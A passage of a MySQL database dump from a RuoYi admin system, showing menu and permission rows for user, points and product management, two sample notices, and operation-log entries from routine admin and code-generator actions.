13:37:29','',NULL,''),(1002,'用户修改',100,3,'#','','F','0','1','system:user:edit','#','admin','2022-01-05 13:37:29','',NULL,''),(1003,'用户删除',100,4,'#','','F','0','1','system:user:remove','#','admin','2022-01-05 13:37:29','',NULL,''),(1004,'用户导出',100,5,'#','','F','0','1','system:user:export','#','admin','2022-01-05 13:37:29','',NULL,''),(1005,'用户导入',100,6,'#','','F','0','1','system:user:import','#','admin','2022-01-05 13:37:29','',NULL,''),(1006,'重置密码',100,7,'#','','F','0','1','system:user:resetPwd','#','admin','2022-01-05 13:37:29','',NULL,''),(1007,'角色查询',101,1,'#','','F','0','1','system:role:list','#','admin','2022-01-05 13:37:29','',NULL,''),(1008,'角色新增',101,2,'#','','F','0','1','system:role:add','#','admin','2022-01-05 13:37:29','',NULL,''),(1009,'角色修改',101,3,'#','','F','0','1','system:role:edit','#','admin','2022-01-05 13:37:29','',NULL,''),(1010,'角色删除',101,4,'#','','F','0','1','system:role:remove','#','admin','2022-01-05 13:37:29','',NULL,''),(1011,'角色导出',101,5,'#','','F','0','1','system:role:export','#','admin','2022-01-05 13:37:29','',NULL,''),(1012,'菜单查询',102,1,'#','','F','0','1','system:menu:list','#','admin','2022-01-05 13:37:29','',NULL,''),(1013,'菜单新增',102,2,'#','','F','0','1','system:menu:add','#','admin','2022-01-05 13:37:29','',NULL,''),(1014,'菜单修改',102,3,'#','','F','0','1','system:menu:edit','#','admin','2022-01-05 13:37:29','',NULL,''),(1015,'菜单删除',102,4,'#','','F','0','1','system:menu:remove','#','admin','2022-01-05 13:37:29','',NULL,''),(1016,'部门查询',103,1,'#','','F','0','1','system:dept:list','#','admin','2022-01-05 13:37:30','',NULL,''),(1017,'部门新增',103,2,'#','','F','0','1','system:dept:add','#','admin','2022-01-05 13:37:30','',NULL,''),(1018,'部门修改',103,3,'#','','F','0','1','system:dept:edit','#','admin','2022-01-05 13:37:30','',NULL,''),(1019,'部门删除',103,4,'#','','F','0','1','system:dept:remove','#','admin','2022-01-05 13:37:30','',NULL,''),(1020,'岗位查询',104,1,'#','','F','0','1','system:post:list','#','admin','2022-01-05 13:37:30','',NULL,''),(1021,'岗位新增',104,2,'#','','F','0','1','system:post:add','#','admin','2022-01-05 13:37:30','',NULL,''),(1022,'岗位修改',104,3,'#','','F','0','1','system:post:edit','#','admin','2022-01-05 13:37:30','',NULL,''),(1023,'岗位删除',104,4,'#','','F','0','1','system:post:remove','#','admin','2022-01-05 13:37:30','',NULL,''),(1024,'岗位导出',104,5,'#','','F','0','1','system:post:export','#','admin','2022-01-05 13:37:30','',NULL,''),(1025,'字典查询',105,1,'#','','F','0','1','system:dict:list','#','admin','2022-01-05 13:37:30','',NULL,''),(1026,'字典新增',105,2,'#','','F','0','1','system:dict:add','#','admin','2022-01-05 13:37:30','',NULL,''),(1027,'字典修改',105,3,'#','','F','0','1','system:dict:edit','#','admin','2022-01-05 13:37:30','',NULL,''),(1028,'字典删除',105,4,'#','','F','0','1','system:dict:remove','#','admin','2022-01-05 13:37:30','',NULL,''),(1029,'字典导出',105,5,'#','','F','0','1','system:dict:export','#','admin','2022-01-05 13:37:30','',NULL,''),(1030,'参数查询',106,1,'#','','F','0','1','system:config:list','#','admin','2022-01-05 13:37:30','',NULL,''),(1031,'参数新增',106,2,'#','','F','0','1','system:config:add','#','admin','2022-01-05 13:37:30','',NULL,''),(1032,'参数修改',106,3,'#','','F','0','1','system:config:edit','#','admin','2022-01-05 13:37:30','',NULL,''),(1033,'参数删除',106,4,'#','','F','0','1','system:config:remove','#','admin','2022-01-05 13:37:30','',NULL,''),(1034,'参数导出',106,5,'#','','F','0','1','system:config:export','#','admin','2022-01-05 13:37:30','',NULL,''),(1035,'公告查询',107,1,'#','','F','0','1','system:notice:list','#','admin','2022-01-05 13:37:30','',NULL,''),(1036,'公告新增',107,2,'#','','F','0','1','system:notice:add','#','admin','2022-01-05 13:37:30','',NULL,''),(1037,'公告修改',107,3,'#','','F','0','1','system:notice:edit','#','admin','2022-01-05 13:37:30','',NULL,''),(1038,'公告删除',107,4,'#','','F','0','1','system:notice:remove','#','admin','2022-01-05 13:37:30','',NULL,''),(1039,'操作查询',500,1,'#','','F','0','1','monitor:operlog:list','#','admin','2022-01-05 13:37:30','',NULL,''),(1040,'操作删除',500,2,'#','','F','0','1','monitor:operlog:remove','#','admin','2022-01-05 13:37:30','',NULL,''),(1041,'详细信息',500,3,'#','','F','0','1','monitor:operlog:detail','#','admin','2022-01-05 13:37:30','',NULL,''),(1042,'日志导出',500,4,'#','','F','0','1','monitor:operlog:export','#','admin','2022-01-05 13:37:30','',NULL,''),(1043,'登录查询',501,1,'#','','F','0','1','monitor:logininfor:list','#','admin','2022-01-05 13:37:30','',NULL,''),(1044,'登录删除',501,2,'#','','F','0','1','monitor:logininfor:remove','#','admin','2022-01-05 13:37:30','',NULL,''),(1045,'日志导出',501,3,'#','','F','0','1','monitor:logininfor:export','#','admin','2022-01-05 13:37:30','',NULL,''),(1046,'账户解锁',501,4,'#','','F','0','1','monitor:logininfor:unlock','#','admin','2022-01-05 13:37:30','',NULL,''),(1047,'在线查询',109,1,'#','','F','0','1','monitor:online:list','#','admin','2022-01-05 13:37:30','',NULL,''),(1048,'批量强退',109,2,'#','','F','0','1','monitor:online:batchForceLogout','#','admin','2022-01-05 13:37:30','',NULL,''),(1049,'单条强退',109,3,'#','','F','0','1','monitor:online:forceLogout','#','admin','2022-01-05 13:37:30','',NULL,''),(1050,'任务查询',110,1,'#','','F','0','1','monitor:job:list','#','admin','2022-01-05 13:37:30','',NULL,''),(1051,'任务新增',110,2,'#','','F','0','1','monitor:job:add','#','admin','2022-01-05 13:37:30','',NULL,''),(1052,'任务修改',110,3,'#','','F','0','1','monitor:job:edit','#','admin','2022-01-05 13:37:30','',NULL,''),(1053,'任务删除',110,4,'#','','F','0','1','monitor:job:remove','#','admin','2022-01-05 13:37:30','',NULL,''),(1054,'状态修改',110,5,'#','','F','0','1','monitor:job:changeStatus','#','admin','2022-01-05 13:37:30','',NULL,''),(1055,'任务详细',110,6,'#','','F','0','1','monitor:job:detail','#','admin','2022-01-05 13:37:30','',NULL,''),(1056,'任务导出',110,7,'#','','F','0','1','monitor:job:export','#','admin','2022-01-05 13:37:30','',NULL,''),(1057,'生成查询',115,1,'#','','F','0','1','tool:gen:list','#','admin','2022-01-05 13:37:30','',NULL,''),(1058,'生成修改',115,2,'#','','F','0','1','tool:gen:edit','#','admin','2022-01-05 13:37:30','',NULL,''),(1059,'生成删除',115,3,'#','','F','0','1','tool:gen:remove','#','admin','2022-01-05 13:37:31','',NULL,''),(1060,'预览代码',115,4,'#','','F','0','1','tool:gen:preview','#','admin','2022-01-05 13:37:31','',NULL,''),(1061,'生成代码',115,5,'#','','F','0','1','tool:gen:code','#','admin','2022-01-05 13:37:31','',NULL,''),(2000,'用户信息',0,4,'#','menuItem','M','0','1','','fa fa-address-book-o','admin','2022-01-05 20:10:20','admin','2022-01-06 00:00:35',''),(2001,'用户信息',2000,1,'/system/userinfo','menuItem','C','0','1','system:userinfo:view','#','admin','2022-01-05 20:12:16','admin','2022-01-06 00:01:22','用户信息菜单'),(2002,'用户信息查询',2001,1,'#','','F','0','1','system:userinfo:list','#','admin','2022-01-05 20:12:16','',NULL,''),(2003,'用户信息新增',2001,2,'#','','F','0','1','system:userinfo:add','#','admin','2022-01-05 20:12:16','',NULL,''),(2004,'用户信息修改',2001,3,'#','','F','0','1','system:userinfo:edit','#','admin','2022-01-05 20:12:16','',NULL,''),(2005,'用户信息删除',2001,4,'#','','F','0','1','system:userinfo:remove','#','admin','2022-01-05 20:12:16','',NULL,''),(2006,'用户信息导出',2001,5,'#','','F','0','1','system:userinfo:export','#','admin','2022-01-05 20:12:16','',NULL,''),(2013,'积分管理',0,5,'#','menuItem','M','0','1',NULL,'fa fa-line-chart','admin','2022-04-04 22:29:35','',NULL,''),(2014,'积分减少',2013,1,'/system/jifenminus','','C','0','1','system:jifenminus:view','#','admin','2022-04-04 22:30:56','',NULL,'积分增加菜单'),(2015,'积分减少查询',2014,1,'#','','F','0','1','system:jifenminus:list','#','admin','2022-04-04 22:30:56','',NULL,''),(2016,'积分减少新增',2014,2,'#','','F','0','1','system:jifenminus:add','#','admin','2022-04-04 22:30:56','',NULL,''),(2017,'积分减少修改',2014,3,'#','','F','0','1','system:jifenminus:edit','#','admin','2022-04-04 22:30:56','',NULL,''),(2018,'积分减少删除',2014,4,'#','','F','0','1','system:jifenminus:remove','#','admin','2022-04-04 22:30:56','',NULL,''),(2019,'积分减少导出',2014,5,'#','','F','0','1','system:jifenminus:export','#','admin','2022-04-04 22:30:56','',NULL,''),(2020,'建议',2000,1,'/system/suggest','','C','0','1','system:suggest:view','#','admin','2022-04-04 22:31:28','',NULL,'建议菜单'),(2021,'建议查询',2020,1,'#','','F','0','1','system:suggest:list','#','admin','2022-04-04 22:31:29','',NULL,''),(2022,'建议新增',2020,2,'#','','F','0','1','system:suggest:add','#','admin','2022-04-04 22:31:29','',NULL,''),(2023,'建议修改',2020,3,'#','','F','0','1','system:suggest:edit','#','admin','2022-04-04 22:31:29','',NULL,''),(2024,'建议删除',2020,4,'#','','F','0','1','system:suggest:remove','#','admin','2022-04-04 22:31:29','',NULL,''),(2025,'建议导出',2020,5,'#','','F','0','1','system:suggest:export','#','admin','2022-04-04 22:31:29','',NULL,''),(2026,'商品管理',0,6,'#','menuItem','M','0','1',NULL,'fa fa-tags','admin','2022-04-04 22:34:17','',NULL,''),(2027,'商品分类',2026,1,'/system/category','','C','0','1','system:category:view','#','admin','2022-04-04 22:35:28','',NULL,'商品分类菜单'),(2028,'商品分类查询',2027,1,'#','','F','0','1','system:category:list','#','admin','2022-04-04 22:35:28','',NULL,''),(2029,'商品分类新增',2027,2,'#','','F','0','1','system:category:add','#','admin','2022-04-04 22:35:28','',NULL,''),(2030,'商品分类修改',2027,3,'#','','F','0','1','system:category:edit','#','admin','2022-04-04 22:35:28','',NULL,''),(2031,'商品分类删除',2027,4,'#','','F','0','1','system:category:remove','#','admin','2022-04-04 22:35:28','',NULL,''),(2032,'商品分类导出',2027,5,'#','','F','0','1','system:category:export','#','admin','2022-04-04 22:35:28','',NULL,''),(2033,'积分增加',2013,1,'/system/jifenplus','','C','0','1','system:jifenplus:view','#','admin','2022-04-04 22:36:51','',NULL,'积分增加菜单'),(2034,'积分增加查询',2033,1,'#','','F','0','1','system:jifenplus:list','#','admin','2022-04-04 22:36:51','',NULL,''),(2035,'积分增加新增',2033,2,'#','','F','0','1','system:jifenplus:add','#','admin','2022-04-04 22:36:51','',NULL,''),(2036,'积分增加修改',2033,3,'#','','F','0','1','system:jifenplus:edit','#','admin','2022-04-04 22:36:51','',NULL,''),(2037,'积分增加删除',2033,4,'#','','F','0','1','system:jifenplus:remove','#','admin','2022-04-04 22:36:51','',NULL,''),(2038,'积分增加导出',2033,5,'#','','F','0','1','system:jifenplus:export','#','admin','2022-04-04 22:36:51','',NULL,''),(2045,'商品列',2026,1,'/system/shoplist','','C','0','1','system:shoplist:view','#','admin','2022-04-04 22:39:55','',NULL,'商品列菜单'),(2046,'商品列查询',2045,1,'#','','F','0','1','system:shoplist:list','#','admin','2022-04-04 22:39:55','',NULL,''),(2047,'商品列新增',2045,2,'#','','F','0','1','system:shoplist:add','#','admin','2022-04-04 22:39:55','',NULL,''),(2048,'商品列修改',2045,3,'#','','F','0','1','system:shoplist:edit','#','admin','2022-04-04 22:39:55','',NULL,''),(2049,'商品列删除',2045,4,'#','','F','0','1','system:shoplist:remove','#','admin','2022-04-04 22:39:55','',NULL,''),(2050,'商品列导出',2045,5,'#','','F','0','1','system:shoplist:export','#','admin','2022-04-04 22:39:55','',NULL,''),(2051,'轮播图',2026,1,'/system/lunbo','','C','0','1','system:lunbo:view','#','admin','2022-04-04 22:40:45','',NULL,'轮播图菜单'),(2052,'轮播图查询',2051,1,'#','','F','0','1','system:lunbo:list','#','admin','2022-04-04 22:40:45','',NULL,''),(2053,'轮播图新增',2051,2,'#','','F','0','1','system:lunbo:add','#','admin','2022-04-04 22:40:45','',NULL,''),(2054,'轮播图修改',2051,3,'#','','F','0','1','system:lunbo:edit','#','admin','2022-04-04 22:40:45','',NULL,''),(2055,'轮播图删除',2051,4,'#','','F','0','1','system:lunbo:remove','#','admin','2022-04-04 22:40:45','',NULL,''),(2056,'轮播图导出',2051,5,'#','','F','0','1','system:lunbo:export','#','admin','2022-04-04 22:40:45','',NULL,''),(2057,'位置列表',2000,1,'/system/location','','C','0','1','system:location:view','#','admin','2022-04-04 22:42:14','',NULL,'位置列表菜单'),(2058,'位置列表查询',2057,1,'#','','F','0','1','system:location:list','#','admin','2022-04-04 22:42:14','',NULL,''),(2059,'位置列表新增',2057,2,'#','','F','0','1','system:location:add','#','admin','2022-04-04 22:42:14','',NULL,''),(2060,'位置列表修改',2057,3,'#','','F','0','1','system:location:edit','#','admin','2022-04-04 22:42:14','',NULL,''),(2061,'位置列表删除',2057,4,'#','','F','0','1','system:location:remove','#','admin','2022-04-04 22:42:14','',NULL,''),(2062,'位置列表导出',2057,5,'#','','F','0','1','system:location:export','#','admin','2022-04-04 22:42:14','',NULL,'');
/*!40000 ALTER TABLE `sys_menu` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sys_notice`
--

DROP TABLE IF EXISTS `sys_notice`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `sys_notice` (
  `notice_id` int(4) NOT NULL AUTO_INCREMENT COMMENT '公告ID',
  `notice_title` varchar(50) NOT NULL COMMENT '公告标题',
  `notice_type` char(1) NOT NULL COMMENT '公告类型（1通知 2公告）',
  `notice_content` varchar(2000) DEFAULT NULL COMMENT '公告内容',
  `status` char(1) DEFAULT '0' COMMENT '公告状态（0正常 1关闭）',
  `create_by` varchar(64) DEFAULT '' COMMENT '创建者',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) DEFAULT '' COMMENT '更新者',
  `update_time` datetime DEFAULT NULL COMMENT '更新时间',
  `remark` varchar(255) DEFAULT NULL COMMENT '备注',
  PRIMARY KEY (`notice_id`)
) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8 COMMENT='通知公告表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sys_notice`
--

LOCK TABLES `sys_notice` WRITE;
/*!40000 ALTER TABLE `sys_notice` DISABLE KEYS */;
INSERT INTO `sys_notice` VALUES (1,'温馨提醒：2018-07-01 若依新版本发布啦','2','新版本内容','0','admin','2022-01-05 13:37:35','',NULL,'管理员'),(2,'维护通知：2018-07-01 若依系统凌晨维护','1','维护内容','0','admin','2022-01-05 13:37:35','',NULL,'管理员');
/*!40000 ALTER TABLE `sys_notice` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sys_oper_log`
--

DROP TABLE IF EXISTS `sys_oper_log`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `sys_oper_log` (
  `oper_id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '日志主键',
  `title` varchar(50) DEFAULT '' COMMENT '模块标题',
  `business_type` int(2) DEFAULT '0' COMMENT '业务类型（0其它 1新增 2修改 3删除）',
  `method` varchar(100) DEFAULT '' COMMENT '方法名称',
  `request_method` varchar(10) DEFAULT '' COMMENT '请求方式',
  `operator_type` int(1) DEFAULT '0' COMMENT '操作类别（0其它 1后台用户 2手机端用户）',
  `oper_name` varchar(50) DEFAULT '' COMMENT '操作人员',
  `dept_name` varchar(50) DEFAULT '' COMMENT '部门名称',
  `oper_url` varchar(255) DEFAULT '' COMMENT '请求URL',
  `oper_ip` varchar(128) DEFAULT '' COMMENT '主机地址',
  `oper_location` varchar(255) DEFAULT '' COMMENT '操作地点',
  `oper_param` varchar(2000) DEFAULT '' COMMENT '请求参数',
  `json_result` varchar(2000) DEFAULT '' COMMENT '返回参数',
  `status` int(1) DEFAULT '0' COMMENT '操作状态（0正常 1异常）',
  `error_msg` varchar(2000) DEFAULT '' COMMENT '错误消息',
  `oper_time` datetime DEFAULT NULL COMMENT '操作时间',
  PRIMARY KEY (`oper_id`)
) ENGINE=InnoDB AUTO_INCREMENT=161 DEFAULT CHARSET=utf8 COMMENT='操作日志记录';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sys_oper_log`
--

LOCK TABLES `sys_oper_log` WRITE;
/*!40000 ALTER TABLE `sys_oper_log` DISABLE KEYS */;
INSERT INTO `sys_oper_log` VALUES (100,'代码生成',6,'com.ruoyi.project.tool.gen.controller.GenController.importTableSave()','POST',1,'admin','研发部门','/tool/gen/importTable','127.0.0.1','内网IP','{\"tables\":[\"suggest,jifenplus,kind,jifenminus,location,category,shoplist,lunbo,userinfo,HistoricalRecord,ShoppingCenter,Points,UserInformation,demojob\"]}','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-01-05 20:03:55'),(101,'菜单管理',2,'com.ruoyi.project.system.menu.controller.MenuController.editSave()','POST',1,'admin','研发部门','/system/menu/edit','1.202.230.130','XX XX','{\"menuId\":[\"4\"],\"parentId\":[\"0\"],\"menuType\":[\"C\"],\"menuName\":[\"若依官网\"],\"url\":[\"http://ruoyi.vip\"],\"target\":[\"menuBlank\"],\"perms\":[\"\"],\"orderNum\":[\"4\"],\"icon\":[\"fa fa-location-arrow\"],\"visible\":[\"1\"],\"isRefresh\":[\"1\"]}','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-01-05 20:06:16'),(102,'菜单管理',2,'com.ruoyi.project.system.menu.controller.MenuController.editSave()','POST',1,'admin','研发部门','/system/menu/edit','1.202.230.130','XX XX','{\"menuId\":[\"2\"],\"parentId\":[\"0\"],\"menuType\":[\"M\"],\"menuName\":[\"系统监控\"],\"url\":[\"#\"],\"target\":[\"menuItem\"],\"perms\":[\"\"],\"orderNum\":[\"2\"],\"icon\":[\"fa fa-video-camera\"],\"visible\":[\"1\"],\"isRefresh\":[\"1\"]}','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-01-05 20:06:26'),(103,'菜单管理',2,'com.ruoyi.project.system.menu.controller.MenuController.editSave()','POST',1,'admin','研发部门','/system/menu/edit','1.202.230.130','XX XX','{\"menuId\":[\"1\"],\"parentId\":[\"0\"],\"menuType\":[\"M\"],\"menuName\":[\"系统管理\"],\"url\":[\"#\"],\"target\":[\"menuItem\"],\"perms\":[\"\"],\"orderNum\":[\"1\"],\"icon\":[\"fa fa-gear\"],\"visible\":[\"1\"],\"isRefresh\":[\"1\"]}','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-01-05 20:06:31'),(104,'菜单管理',1,'com.ruoyi.project.system.menu.controller.MenuController.addSave()','POST',1,'admin','研发部门','/system/menu/add','1.202.230.130','XX XX','{\"parentId\":[\"0\"],\"menuType\":[\"M\"],\"menuName\":[\"用户信息 \"],\"url\":[\"\"],\"target\":[\"menuItem\"],\"perms\":[\"\"],\"orderNum\":[\"2\"],\"icon\":[\"fa fa-address-book-o\"],\"visible\":[\"0\"],\"isRefresh\":[\"1\"]}','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-01-05 20:10:20'),(105,'代码生成',2,'com.ruoyi.project.tool.gen.controller.GenController.editSave()','POST',1,'admin','研发部门','/tool/gen/edit','1.202.230.130','XX XX','{\"tableId\":[\"14\"],\"tableName\":[\"userinfo\"],\"tableComment\":[\"用户信息\"],\"className\":[\"Userinfo\"],\"functionAuthor\":[\"ruoyi\"],\"remark\":[\"\"],\"columns[0].columnId\":[\"96\"],\"columns[0].sort\":[\"1\"],\"columns[0].columnComment\":[\"openid\"],\"columns[0].javaType\":[\"String\"],\"columns[0].javaField\":[\"openid\"],\"columns[0].isInsert\":[\"1\"],\"columns[0].queryType\":[\"EQ\"],\"columns[0].htmlType\":[\"input\"],\"columns[0].dictType\":[\"\"],\"columns[1].columnId\":[\"97\"],\"columns[1].sort\":[\"2\"],\"columns[1].columnComment\":[\"昵称\"],\"columns[1].javaType\":[\"String\"],\"columns[1].javaField\":[\"nickName\"],\"columns[1].isInsert\":[\"1\"],\"columns[1].isEdit\":[\"1\"],\"columns[1].isList\":[\"1\"],\"columns[1].isQuery\":[\"1\"],\"columns[1].queryType\":[\"LIKE\"],\"columns[1].isRequired\":[\"1\"],\"columns[1].htmlType\":[\"input\"],\"columns[1].dictType\":[\"\"],\"columns[2].columnId\":[\"98\"],\"columns[2].sort\":[\"3\"],\"columns[2].columnComment\":[\"头像\"],\"columns[2].javaType\":[\"String\"],\"columns[2].javaField\":[\"avatarUrl\"],\"columns[2].isInsert\":[\"1\"],\"columns[2].isEdit\":[\"1\"],\"columns[2].isList\":[\"1\"],\"columns[2].isQuery\":[\"1\"],\"columns[2].queryType\":[\"EQ\"],\"columns[2].isRequired\":[\"1\"],\"columns[2].htmlType\":[\"textarea\"],\"columns[2].dictType\":[\"\"],\"columns[3].columnId\":[\"99\"],\"columns[3].sort\":[\"4\"],\"columns[3].columnComment\":[\"性别\"],\"columns[3].javaType\":[\"Integer\"],\"columns[3].javaField\":[\"gender\"],\"columns[3].isInsert\":[\"1\"],\"columns[3].isEdit\":[\"1\"],\"columns[3].isList\":[\"1\"],\"columns[3].isQuery\":[\"1\"],\"columns[3].queryType\":[\"EQ\"],\"columns[3].isRequired\":[\"1\"],\"columns[3].htmlType\":[\"input\"],\"columns[3].dictType\":[\"\"],\"columns[4].columnId\":[\"100\"],\"columns[4].sort\":[\"5\"],\"columns[4].columnComment\":[\"积分\"],\"columns[4].javaType\":[\"Long\"],\"columns[4].javaField\":[\"jifen\"],\"columns[4].isInsert\":[\"1\"],\"columns[4].isEdit\":[\"1\"],\"columns[4].isList\":[\"1\"],\"columns[4].isQuery\":[\"1\"],\"columns[4].queryType\":[\"EQ\"],\"columns[4].htmlType\":[\"input\"],\"columns[4].dictType\":[\"\"],\"columns[5].columnId\":[\"101\"],\"columns[5].sort\":[\"6\"],\"columns[5].columnComment\":[\"省\"],\"colum','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-01-05 20:10:59'),(106,'代码生成',8,'com.ruoyi.project.tool.gen.controller.GenController.download()','GET',1,'admin','研发部门','/tool/gen/download/userinfo','1.202.230.130','XX XX','\"userinfo\"',NULL,0,NULL,'2022-01-05 20:11:33'),(107,'代码生成',2,'com.ruoyi.project.tool.gen.controller.GenController.editSave()','POST',1,'admin','研发部门','/tool/gen/edit','1.202.230.130','XX XX','{\"tableId\":[\"13\"],\"tableName\":[\"suggest\"],\"tableComment\":[\"建议1111\"],\"className\":[\"Suggest\"],\"functionAuthor\":[\"ruoyi\"],\"remark\":[\"\"],\"columns[0].columnId\":[\"91\"],\"columns[0].sort\":[\"1\"],\"columns[0].columnComment\":[\"openid\"],\"columns[0].javaType\":[\"String\"],\"columns[0].javaField\":[\"openid\"],\"columns[0].isInsert\":[\"1\"],\"columns[0].isEdit\":[\"1\"],\"columns[0].isList\":[\"1\"],\"columns[0].isQuery\":[\"1\"],\"columns[0].queryType\":[\"EQ\"],\"columns[0].isRequired\":[\"1\"],\"columns[0].htmlType\":[\"input\"],\"columns[0].dictType\":[\"\"],\"columns[1].columnId\":[\"92\"],\"columns[1].sort\":[\"2\"],\"columns[1].columnComment\":[\"昵称\"],\"columns[1].javaType\":[\"String\"],\"columns[1].javaField\":[\"nickname\"],\"columns[1].isInsert\":[\"1\"],\"columns[1].isEdit\":[\"1\"],\"columns[1].isList\":[\"1\"],\"columns[1].isQuery\":[\"1\"],\"columns[1].queryType\":[\"LIKE\"],\"columns[1].htmlType\":[\"input\"],\"columns[1].dictType\":[\"\"],\"columns[2].columnId\":[\"93\"],\"columns[2].sort\":[\"3\"],\"columns[2].columnComment\":[\"头像\"],\"columns[2].javaType\":[\"String\"],\"columns[2].javaField\":[\"avatar\"],\"columns[2].isInsert\":[\"1\"],\"columns[2].isEdit\":[\"1\"],\"columns[2].isList\":[\"1\"],\"columns[2].isQuery\":[\"1\"],\"columns[2].queryType\":[\"EQ\"],\"columns[2].htmlType\":[\"textarea\"],\"columns[2].dictType\":[\"\"],\"columns[3].columnId\":[\"94\"],\"columns[3].sort\":[\"4\"],\"columns[3].columnComment\":[\"建议\"],\"columns[3].javaType\":[\"String\"],\"columns[3].javaField\":[\"suggest\"],\"columns[3].isInsert\":[\"1\"],\"columns[3].isEdit\":[\"1\"],\"columns[3].isList\":[\"1\"],\"columns[3].isQuery\":[\"1\"],\"columns[3].queryType\":[\"EQ\"],\"columns[3].htmlType\":[\"textarea\"],\"columns[3].dictType\":[\"\"],\"columns[4].columnId\":[\"95\"],\"columns[4].sort\":[\"5\"],\"columns[4].columnComment\":[\"创建时间\"],\"columns[4].javaType\":[\"Date\"],\"columns[4].javaField\":[\"createTime\"],\"columns[4].isInsert\":[\"1\"],\"columns[4].queryType\":[\"EQ\"],\"columns[4].htmlType\":[\"datetime\"],\"columns[4].dictType\":[\"\"],\"tplCategory\":[\"crud\"],\"packageName\":[\"com.ruoyi.project.system\"],\"moduleName\":[\"system\"],\"businessName\":[\"suggest\"],\"functionName\":[\"建议\"],\"para','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-01-05 22:44:15'),(108,'代码生成',2,'com.ruoyi.project.tool.gen.controller.GenController.editSave()','POST',1,'admin','研发部门','/tool/gen/edit','1.202.230.130','XX XX','{\"tableId\":[\"13\"],\"tableName\":[\"suggest\"],\"tableComment\":[\"建议2222\"],\"className\":[\"Suggest\"],\"functionAuthor\":[\"ruoyi\"],\"remark\":[\"\"],\"columns[0].columnId\":[\"91\"],\"columns[0].sort\":[\"1\"],\"columns[0].columnComment\":[\"openid\"],\"columns[0].javaType\":[\"String\"],\"columns[0].javaField\":[\"openid\"],\"columns[0].isInsert\":[\"1\"],\"columns[0].isEdit\":[\"1\"],\"columns[0].isList\":[\"1\"],\"columns[0].isQuery\":[\"1\"],\"columns[0].queryType\":[\"EQ\"],\"columns[0].isRequired\":[\"1\"],\"columns[0].htmlType\":[\"input\"],\"columns[0].dictType\":[\"\"],\"columns[1].columnId\":[\"92\"],\"columns[1].sort\":[\"2\"],\"columns[1].columnComment\":[\"昵称\"],\"columns[1].javaType\":[\"String\"],\"columns[1].javaField\":[\"nickname\"],\"columns[1].isInsert\":[\"1\"],\"columns[1].isEdit\":[\"1\"],\"columns[1].isList\":[\"1\"],\"columns[1].isQuery\":[\"1\"],\"columns[1].queryType\":[\"LIKE\"],\"columns[1].htmlType\":[\"input\"],\"columns[1].dictType\":[\"\"],\"columns[2].columnId\":[\"93\"],\"columns[2].sort\":[\"3\"],\"columns[2].columnComment\":[\"头像\"],\"columns[2].javaType\":[\"String\"],\"columns[2].javaField\":[\"avatar\"],\"columns[2].isInsert\":[\"1\"],\"columns[2].isEdit\":[\"1\"],\"columns[2].isList\":[\"1\"],\"columns[2].isQuery\":[\"1\"],\"columns[2].queryType\":[\"EQ\"],\"columns[2].htmlType\":[\"textarea\"],\"columns[2].dictType\":[\"\"],\"columns[3].columnId\":[\"94\"],\"columns[3].sort\":[\"4\"],\"columns[3].columnComment\":[\"建议\"],\"columns[3].javaType\":[\"String\"],\"columns[3].javaField\":[\"suggest\"],\"columns[3].isInsert\":[\"1\"],\"columns[3].isEdit\":[\"1\"],\"columns[3].isList\":[\"1\"],\"columns[3].isQuery\":[\"1\"],\"columns[3].queryType\":[\"EQ\"],\"columns[3].htmlType\":[\"textarea\"],\"columns[3].dictType\":[\"\"],\"columns[4].columnId\":[\"95\"],\"columns[4].sort\":[\"5\"],\"columns[4].columnComment\":[\"创建时间\"],\"columns[4].javaType\":[\"Date\"],\"columns[4].javaField\":[\"createTime\"],\"columns[4].isInsert\":[\"1\"],\"columns[4].queryType\":[\"EQ\"],\"columns[4].htmlType\":[\"datetime\"],\"columns[4].dictType\":[\"\"],\"tplCategory\":[\"crud\"],\"packageName\":[\"com.ruoyi.project.system\"],\"moduleName\":[\"system\"],\"businessName\":[\"suggest\"],\"functionName\":[\"建议\"],\"para','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-01-05 22:44:42'),(109,'菜单管理',2,'com.ruoyi.project.system.menu.controller.MenuController.editSave()','POST',1,'admin','研发部门','/system/menu/edit','1.202.230.130','XX XX','{\"menuId\":[\"2000\"],\"parentId\":[\"0\"],\"menuType\":[\"M\"],\"menuName\":[\"用户信息\"],\"url\":[\"#\"],\"target\":[\"menuItem\"],\"perms\":[\"\"],\"orderNum\":[\"3\"],\"icon\":[\"fa fa-address-book-o\"],\"visible\":[\"0\"],\"isRefresh\":[\"1\"]}','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-01-06 00:00:23'),(110,'菜单管理',2,'com.ruoyi.project.system.menu.controller.MenuController.editSave()','POST',1,'admin','研发部门','/system/menu/edit','1.202.230.130','XX XX','{\"menuId\":[\"2000\"],\"parentId\":[\"0\"],\"menuType\":[\"M\"],\"menuName\":[\"用户信息\"],\"url\":[\"#\"],\"target\":[\"menuItem\"],\"perms\":[\"\"],\"orderNum\":[\"5\"],\"icon\":[\"fa fa-address-book-o\"],\"visible\":[\"0\"],\"isRefresh\":[\"1\"]}','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-01-06 00:00:27'),(111,'菜单管理',2,'com.ruoyi.project.system.menu.controller.MenuController.editSave()','POST',1,'admin','研发部门','/system/menu/edit','1.202.230.130','XX 